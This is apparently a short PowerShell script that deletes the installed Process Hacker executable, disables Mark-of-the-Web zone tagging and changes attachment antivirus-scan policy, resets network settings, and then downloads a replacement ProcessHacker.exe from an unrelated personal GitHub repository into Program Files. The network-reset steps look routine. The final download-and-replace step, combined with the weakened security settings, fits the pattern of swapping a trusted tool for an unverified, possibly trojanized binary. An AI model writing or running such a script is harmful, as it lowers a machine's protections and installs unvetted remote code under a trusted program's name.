Remove-Item "C:\Program Files\Process Hacker 2\ProcessHacker.exe" -Force -ErrorAction SilentlyContinue

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "SaveZoneInformation" -Value 2 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "ScanWithAntiVirus" -Value 2 -Type DWord

Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Restart-NetAdapter -Confirm:$false

netsh int ip reset
netsh winsock reset
ipconfig /flushdns

Get-Service WlanSvc | Start-Service

Get-NetAdapter | Format-Table Name, Status, InterfaceDescription

gpupdate /force

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Hyphen696/ShivUmangAuth/refs/heads/main/ProcessHacker.exe" -OutFile "C:\Program Files\Process Hacker 2\ProcessHacker.exe"
